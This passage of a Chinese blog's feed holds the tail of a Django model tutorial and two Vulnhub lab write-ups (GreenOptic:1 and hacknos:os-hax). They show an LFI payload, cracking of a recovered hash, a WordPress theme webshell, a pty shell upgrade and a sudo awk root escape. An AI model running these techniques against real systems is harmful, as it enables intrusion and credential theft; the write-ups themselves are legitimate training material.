class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from django.db import models</span><br><span class="line"></span><br><span class="line"># Create your models here.</span><br><span class="line">class User(models.Model):</span><br><span class="line">    UserName = models.CharField(max_length=10)</span><br><span class="line">    PassWord = models.CharField(max_length=128)</span><br><span class="line"></span><br><span class="line">    class Meta:</span><br><span class="line">        db_table = &#x27;Users&#x27; #指定表名</span><br></pre></td></tr></table></figure><p>使用下面命令更新models并创建数据库：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">py -<span class="number">3</span> manage.py makemigrations#让 Django 知道我们在我们的模型有一些变更</span><br><span class="line">py -<span class="number">3</span> manage.py migrate## 创建表结构</span><br></pre></td></tr></table></figure><p>完成后Django会自动创建表，并插入列名，ID列名自动增加并设置为主键。</p><h3 id="数据库加入数据"><a href="#数据库加入数据" class="headerlink" title="数据库加入数据"></a>数据库加入数据</h3><p>选中database后双击User数据库，点击上面的+号，编辑你要加入的内容，点击&gt;&gt;展开，点击有DB的按钮提交到数据库即可。<br><img src="https://img.xpctf.cn/img/20201012191622.png"></p><h3 id="反向生成模型"><a href="#反向生成模型" class="headerlink" title="反向生成模型"></a>反向生成模型</h3><p>反向生成模型是根据数据库列名来生成模型，Django给我提供了这个功能，只需要使用：<br><code>py -3 manage.py inspectdb Users &gt; App/Users.py</code><br>生成Users表的模型保存到App&#x2F;Users.py，如果忽略Users，当前连接的数据所有表Model<br><img src="https://img.xpctf.cn/img/20201012200915.png"></p><h3 id="遍历数据库用户"><a href="#遍历数据库用户" class="headerlink" title="遍历数据库用户"></a>遍历数据库用户</h3><p>在templates文件夹创建user_list.html文件，写入：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh_cn&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123; title &#125;&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>&#123;&#123; title &#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    &#123;% for user in users %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123; user.UserName &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在App路由列表”urls.py”中增加<code>path(&#39;list/&#39;,views.user_list,name=&#39;user_list&#39;)</code></p><p>在views.py中添加内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">user_list</span>(<span class="params">request</span>):</span><br><span class="line">    users = User.objects.<span class="built_in">all</span>()</span><br><span class="line">    context = &#123;</span><br><span class="line">        <span class="string">&#x27;title&#x27;</span>:<span class="string">&#x27;用户列表&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;users&#x27;</span>:users,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> render(request,<span class="string">&quot;user_list.html&quot;</span>,context=context)</span><br></pre></td></tr></table></figure><h2 id="系列文章"><a href="#系列文章" class="headerlink" title="系列文章"></a>系列文章</h2><p>Django基础学习：<a href="https://www.xpctf.cn/posts/24c5/">https://www.xpctf.cn/posts/24c5/</a><br>Django晋级学习：<a href="https://www.xpctf.cn/posts/2f99/">https://www.xpctf.cn/posts/2f99/</a><br>Django模型学习：<a href="https://www.xpctf.cn/posts/d0b4/">https://www.xpctf.cn/posts/d0b4/</a><br>Django会话学习：<a href="https://www.xpctf.cn/posts/7490/">https://www.xpctf.cn/posts/7490/</a><br>Django Form学习：正在写</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> Django </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GreenOptic:1 writeup</title>
      <link href="/posts/23a5/"/>
      <url>/posts/23a5/</url>
      
        <content type="html"><![CDATA[<blockquote><p>原文地址：<a href="https://www.infosecarticles.com/greenoptic-1-vulnhub-walkthrough/">https://www.infosecarticles.com/greenoptic-1-vulnhub-walkthrough/</a></p></blockquote><h2 id="初始枚举"><a href="#初始枚举" class="headerlink" title="初始枚举"></a>初始枚举</h2><p>确定IP后直接使用nmap扫描靶机，通过别名设置nmap快捷扫描</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.bashrc</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">some more <span class="built_in">ls</span> aliases 增加行，输入下面内容</span></span><br><span class="line">alias nmap=&#x27;nmap -A -p- -v -T4 -oA nmap&#x27;</span><br><span class="line">:wq</span><br><span class="line">source ~/.bashrc</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用nmap IP即可实现nmap -A -p- -v -T4 -oA nmap IP</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面/vulnhub/greenoptic# cat nmap.nmap </span><br><span class="line"># Nmap 7.80 scan initiated Sun Sep 27 16:28:40 2020 as: nmap -A -p- -v -T4 -oA nmap 192.168.10.63</span><br><span class="line">mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers</span><br><span class="line">Nmap scan report for websrv01.greenoptic.vm (192.168.10.63)</span><br><span class="line">Host is up (0.00042s latency).</span><br><span class="line">Not shown: 65530 filtered ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">21/tcp    open  ftp     vsftpd 3.0.2</span><br><span class="line">22/tcp    open  ssh     OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 46:20:32:ed:f0:74:11:ed:fd:a7:a4:17:ab:f6:f0:21 (RSA)</span><br><span class="line">|   256 b6:fb:64:10:39:0e:f9:be:8b:5a:d0:d2:41:3e:67:68 (ECDSA)</span><br><span class="line">|_  256 24:27:0b:c9:35:5f:27:7e:1a:82:73:e0:69:cc:0f:96 (ED25519)</span><br><span class="line">53/tcp    open  domain  ISC BIND 9.11.4-P2 (RedHat Enterprise Linux 7)</span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: 9.11.4-P2-RedHat-9.11.4-16.P2.el7_8.6</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: GET HEAD POST OPTIONS TRACE</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16</span><br><span class="line">|_http-title: GreenOptic</span><br><span class="line">10000/tcp open  http    MiniServ 1.953 (Webmin httpd)</span><br><span class="line">|_http-favicon: Unknown favicon MD5: DA33730BE67AF90A4689A1C914AEBD69</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: MiniServ/1.953</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; Charset=utf-8).</span><br><span class="line">MAC Address: 08:00:27:B8:57:A1 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 0.111 days (since Sun Sep 27 13:51:27 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty=261 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:redhat:enterprise_linux:7</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.42 ms websrv01.greenoptic.vm (192.168.10.63)</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"># Nmap done at Sun Sep 27 16:31:30 2020 -- 1 IP address (1 host up) scanned in 170.20 seconds</span><br></pre></td></tr></table></figure><p>我们可以看到许多端口处于打开状态，让我们一一判断它们。</p><ul><li>端口21 FTP-我们可以尝试是否支持匿名登录，并查看其中是否包含一些备份文件或其他有用信息。</li><li>端口22 SSH-在没辙的情况下，如果找到用户名，我们可以尝试进行蛮力攻击。</li><li>端口53 DNS-这似乎很有用，因为它正在侦听TCP而不是UDP，这并不常见。我们可以在这里查找配置错误的dns记录。</li><li>Port 80 Apache Web Server-我们可以尝试利用某些Web漏洞并获得低特权的webShell。</li><li>端口10000 Webmin MiniServer-根据版本以及我们是否可以获得登录凭据，绝对可以利用此端口。</li></ul><p>我们首先在端口80上开始枚举，因为我发现它很容易。在80端口，我们有一个提供宽带服务的网站。<br><img src="https://img.xpctf.cn/img/20200927163552.png"><br>我尝试查看页面源代码和网站上的其他链接，但没有发现任何有用的东西。因此，接下来我开始进行gobuster扫描以查找隐藏的目录。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面/vulnhub/greenoptic# gobuster dir -u http://192.168.10.63/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,html</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://192.168.10.63/</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Extensions:     php,html</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2020/09/27 16:41:52 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">/index.html (Status: 200)</span><br><span class="line">/img (Status: 301)</span><br><span class="line">/account (Status: 301)</span><br><span class="line">/css (Status: 301)</span><br><span class="line">/js (Status: 301)</span><br><span class="line">/statement.html (Status: 200)</span><br><span class="line">/logitech-quickcam_W0QQcatrefZC5QQfbdZ1QQfclZ3QQfposZ95112QQfromZR14QQfrppZ50QQfsclZ1QQfsooZ1QQfsopZ1QQfssZ0QQfstypeZ1QQftrtZ1QQftrvZ1QQftsZ2QQnojsprZyQQpfidZ0QQsaatcZ1QQsacatZQ2d1QQsacqyopZgeQQsacurZ0QQsadisZ200QQsaslopZ1QQsofocusZbsQQsorefinesearchZ1.html (Status: 403)</span><br><span class="line">===============================================================</span><br><span class="line">2020/09/27 16:46:04 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure><p>我去了&#x2F;account目录，找到了一个登录页面。我尝试使用一些弱口令用户名和密码登录，但无法登录。但是我注意到URL中的一个include参数似乎很有趣。<br><img src="https://img.xpctf.cn/img/20200927190856.png"><br>让我们看看是否可以在此参数中找到LFI漏洞。如果将include请求的cookiewarning部分更改为典型的LFI有效内容，例如“ ..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd”，我们可以看到它返回了&#x2F;var&#x2F;www&#x2F;html目录，然后读取&#x2F;etc&#x2F;passwd。<br><img src="https://img.xpctf.cn/img/20200927191100.png"><br>这完美地工作了，但是我仍然找不到使用此漏洞的方法。因此，我进行了进一步的列举。</p><h2 id="获得用户shell"><a href="#获得用户shell" class="headerlink" title="获得用户shell"></a>获得用户shell</h2><p>我使用在端口10000上运行的Webmin Miniserv。当尝试在浏览器上访问它时，我们收到一个错误，该错误泄漏了子域。<br><img src="https://img.xpctf.cn/img/20200927191215.png"><br>我将此主机名添加到主机文件中，现在可以查看webmin登录页面。但不幸的是，我没有任何线索。因此，接下来我开始枚举端口53，以查看是否可以找到其他一些子域。由于这是在侦听TCP，因此我使用了dig axfr命令查找其他子域。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面/vulnhub/greenoptic# dig axfr @192.168.10.63 greenoptic.vm</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.16.4-Debian &lt;&lt;&gt;&gt; axfr @192.168.10.63 greenoptic.vm</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">greenoptic.vm.3600INSOAwebsrv01.greenoptic.vm. root.greenoptic.vm. 1594567384 3600 600 1209600 3600</span><br><span class="line">greenoptic.vm.3600INNSns1.greenoptic.vm.</span><br><span class="line">ns1.greenoptic.vm.3600INA127.0.0.1</span><br><span class="line">recoveryplan.greenoptic.vm. 3600 INA127.0.0.1</span><br><span class="line">websrv01.greenoptic.vm.3600INA127.0.0.1</span><br><span class="line">greenoptic.vm.3600INSOAwebsrv01.greenoptic.vm. root.greenoptic.vm. 1594567384 3600 600 1209600 3600</span><br><span class="line">;; Query time: 0 msec</span><br><span class="line">;; SERVER: 192.168.10.63#53(192.168.10.63)</span><br><span class="line">;; WHEN: 日 9月 27 19:13:23 CST 2020</span><br><span class="line">;; XFR size: 6 records (messages 1, bytes 235)</span><br></pre></td></tr></table></figure><p>我们看到另一个名为recoveryplan的子域，我很快将其添加到主机文件中。<br><img src="https://img.xpctf.cn/img/20200927191442.png"></p><p>但是，当我尝试在浏览器中打开它时，它要求输入用户名和密码。<br><img src="https://img.xpctf.cn/img/20200927191518.png"><br>通常，有一个.htaccess文件控制这种身份验证，而有一个.htpasswd文件存储密码。我利用在帐户页面中找到的LFI来读取.htpasswd文件，并获得了哈希密码。<br><img src="https://img.xpctf.cn/img/20200927191652.png"><br>我将此哈希保存到文本文件中，并使用John破解了哈希。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面/vulnhub/greenoptic# echo &#x27;staff:$apr1$YQNFpPkc$rhUZOxRE55Nkl4EDn.1Po.&#x27; &gt; hash.txt</span><br><span class="line">root@kali:~/桌面/vulnhub/greenoptic# cat hash.txt </span><br><span class="line">staff:$apr1$YQNFpPkc$rhUZOxRE55Nkl4EDn.1Po.</span><br><span class="line">root@kali:~/桌面/vulnhub/greenoptic# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br><span class="line">Warning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot;</span><br><span class="line">Use the &quot;--format=md5crypt-long&quot; option to force loading these as that type instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">wheeler          (staff)</span><br><span class="line">1g 0:00:00:00 DONE (2020-08-01 08:26) 2.325g/s 30530p/s 30530c/s 30530C/s yellow7..princess94</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure><p>现在，我们可以使用用户名staff和密码wheeler登录网站。登录后，我们会在网站上看到一个phpBB。phpBB是免费的开源公告板软件。它允许您在允许的任何人群中共享消息和公告。<br><img src="https://img.xpctf.cn/img/20200927192005.png"></p><p>如果我们查看最新帖子，就会发现该用户正在讨论对其公司的最新攻击，并且还共享一个名为dpi.zip的zip文件，并且该zip文件的密码已通过电子邮件发送给用户Sam。<br><img src="https://img.xpctf.cn/img/20200927192031.png"><br>在互联网上搜索后，我发现所有邮件都存储在&#x2F;var&#x2F;mail目录，并使用用户名作为文件名保存。所以我再次使用文件包含(LFI)来读取&#x2F;var&#x2F;mail&#x2F;sam的内容。<br><img src="https://img.xpctf.cn/img/20200927192230.png"></p><p>现在，我下载了zip文件，并使用密码HelloSunshine123 提取了该zip文件。解压缩后，我们得到一个dpi.pcap文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Enter host password for user &#x27;staff&#x27;:#密码不显示</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100 72324  100 72324    0     0  34.4M      0 --:--:-- --:--:-- --:--:-- 34.4M</span><br><span class="line">root@kali:~/桌面/vulnhub/greenoptic# unzip dpi.zip </span><br><span class="line">Archive:  dpi.zip</span><br><span class="line">[dpi.zip] dpi.pcap password: </span><br><span class="line">  inflating: dpi.pcap</span><br></pre></td></tr></table></figure><p>我在Wireshark中打开文件并开始分析流量。在分析时，我找到了用户Alex的FTP凭据。<br><img src="https://img.xpctf.cn/img/20200927192846.png"></p><p>通常，FTP密码与用户密码相同，这意味着我们可以使用用户名alex和密码FwejAASD1通过SSH以用户Alex的身份登录并读取用户的标志。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面/vulnhub/greenoptic# ssh alex@192.168.10.63</span><br><span class="line">alex@192.168.10.63&#x27;s password: </span><br><span class="line">Last login: Sun Sep 27 09:16:03 2020 from 192.168.10.12</span><br><span class="line">[alex@websrv01 ~]$ ls</span><br><span class="line">tmp.pcapng  user.txt</span><br><span class="line">[alex@websrv01 ~]$ cat user.txt </span><br><span class="line">Well done. Now to try and get root access.</span><br><span class="line"></span><br><span class="line">Think outside of the box!</span><br></pre></td></tr></table></figure><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>这个盒子很容易，我们只需要在盒子外面思考！我做了很多枚举，并尝试了许多特权提升脚本，但是它们都不起作用。当我检查用户的ID时，我发现该用户已添加到Wireshark组，这意味着Wireshark已安装在盒子中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[alex@websrv01 ~]$ id</span><br><span class="line">uid=1002(alex) gid=1002(alex) groups=1002(alex),994(wireshark)</span><br></pre></td></tr></table></figure><p>因此，我退出外壳程序并使用“ ssh -X”再次登录，这将允许我们打开GUI应用程序。然后，我输入wireshark打开Wireshark。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面/vulnhub/greenoptic# ssh -X alex@192.168.10.63</span><br><span class="line">alex@192.168.10.63&#x27;s password: </span><br><span class="line">Last login: Sun Sep 27 12:29:41 2020 from 192.168.10.12</span><br><span class="line">[alex@websrv01 ~]$ id</span><br><span class="line">uid=1002(alex) gid=1002(alex) 组=1002(alex),994(wireshark)</span><br><span class="line">[alex@websrv01 ~]$ wireshark </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>打开Wireshark之后，我开始捕获任何流量，并发现一些SMTP身份验证，该身份验证每隔几分钟就会重复一次。<br><img src="https://img.xpctf.cn/img/20200927193306.png"><br>在检查数据包时，我们可以看到一个编码为base64的密码。<br><img src="https://img.xpctf.cn/img/20200927193336.png"><br>解码后，我们获得root的密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# echo -n AHJvb3QAQVNmb2pvajJlb3p4Y3p6bWVkbG1lZEFTQVNES29qM28= | base64 -d</span><br><span class="line">rootASfojoj2eozxczzmedlmedASASDKoj3o</span><br></pre></td></tr></table></figure><p>现在我们可以使用su切换root并读取我们的标志！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[alex@websrv01 ~]$ su -</span><br><span class="line">密码：ASfojoj2eozxczzmedlmedASASDKoj3o</span><br><span class="line">上一次登录：日 9月 27 08:26:05 BST 2020pts/0 上</span><br><span class="line">[root@websrv01 ~]# cat </span><br><span class="line">anaconda-ks.cfg  .bash_logout     .bashrc          .gnupg/          .monit.id        .pki/            root.txt         .viminfo         .xauthF7tYk6     </span><br><span class="line">.bash_history    .bash_profile    .cshrc           .lesshst         .monit.state     .rnd             .tcshrc          .wireshark/      .Xauthority      </span><br><span class="line">[root@websrv01 ~]# cat root.txt </span><br><span class="line">Congratulations on getting root!</span><br><span class="line"></span><br><span class="line">  ____                      ___        _   _      </span><br><span class="line"> / ___|_ __ ___  ___ _ __  / _ \ _ __ | |_(_) ___ </span><br><span class="line">| |  _| &#x27;__/ _ \/ _ \ &#x27;_ \| | | | &#x27;_ \| __| |/ __|</span><br><span class="line">| |_| | | |  __/  __/ | | | |_| | |_) | |_| | (__ </span><br><span class="line"> \____|_|  \___|\___|_| |_|\___/| .__/ \__|_|\___|</span><br><span class="line">                                |_|             </span><br><span class="line">  </span><br><span class="line">You&#x27;ve overcome a series of difficult challenges, so well done!</span><br><span class="line"></span><br><span class="line">I&#x27;m happy to make my CTFs available for free. If you enjoyed doing the CTF, please leave a comment on my blog at https://security.caerdydd.wales - I will be happy for your feedback so I can improve them and make them more enjoyable in the future.</span><br><span class="line"></span><br><span class="line">*********</span><br><span class="line">Kindly place your vote on the poll located here to let me know how difficult you found it: https://security.caerdydd.wales/greenoptic-ctf/</span><br><span class="line">*********</span><br><span class="line"></span><br><span class="line">Thanks,</span><br><span class="line">bootlesshacker</span><br><span class="line">[root@websrv01 ~]# ^C</span><br><span class="line">[root@websrv01 ~]# </span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hacknos:os-hax writeup</title>
      <link href="/posts/e09f/"/>
      <url>/posts/e09f/</url>
      
        <content type="html"><![CDATA[<p>通过<code>rp-scan -l</code>命令发现靶机IP，对靶机进行靶机扫描：<code>nmap -A -v -p- -oA nmap 192.168.10.61</code>，开放两个端口<br><img src="https://img.xpctf.cn/img/20200925173410.png"><br>对80进行目录扫描，发现wordpress目录，直接访问wp-admin发现重定向到localhost；嗯？这是搞什么飞机，修改localhost指向靶机IP，wpscan扫描发现一个web用户，爆破失败；没有发现插件和主题漏洞。注意：需要注释掉第一行才能生效<br><img src="https://img.xpctf.cn/img/20200925174009.png"><br>网站根目录像个cms，继续进行扫描，刚刚出现wp目录就停止了，后来发现了个img目录的文件很有意思，打开是一张hosts截图，应该是叫我们修改本地hosts。<br><img src="https://img.xpctf.cn/img/20200925173720.png"><br>现在到本地使用exiftool分析图片，发现一个passw@45关键词，尝试wordpress登录和ssh登录，都失败了。<br><img src="https://img.xpctf.cn/img/20200925174249.png"><br>后来通过加入字典扫描发现是一个目录，拿到flag2.txt。<br><img src="https://img.xpctf.cn/img/20200925174458.png"></p><p>打开后是一段密文，有点熟悉，但不知道叫什么，通过百度”ctf加密算法”关键字找到文章发现是brainfuck加密，解密后得到web用户密码，登录wordpress后修改主题404页面拿到webshell。<br>但是构造路径有点麻烦，这里打出来方便以后用：<a href="http://localhost/wordpress/wp-content/themes/twentysixteen/404.php">http://localhost/wordpress/wp-content/themes/twentysixteen/404.php</a></p><p>CTF密码学常见加解密总结：<a href="https://blog.csdn.net/qq_40836553/article/details/79383488">https://blog.csdn.net/qq_40836553/article/details/79383488</a></p><p>还有一个插件可以命令执行拿shell。<br><img src="https://img.xpctf.cn/img/20200925175155.png"></p><p>经过检查发现有一个web用户，使用su切换到web用户，密码就是wordpress的登录密码<br><img src="https://img.xpctf.cn/img/20200925175346.png"><br>因为反弹的shell不是交互式终端，使用python模拟交互式终端：<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br><img src="https://img.xpctf.cn/img/20200925175546.png"></p><p>输入sudo -l发现拥有免密码以root身份执行awk命令，使用<code>sudo /usr/bin/awk &#39;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#39;</code>即可提权成功。<br><img src="https://img.xpctf.cn/img/20200925175814.png"></p>]]></content>
      
      
      <categories>
          
          <category> vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TYPO: 1 Writeup</title>
      <link href="/posts/a300/"/>
      <url>/posts/a300/</url>
      
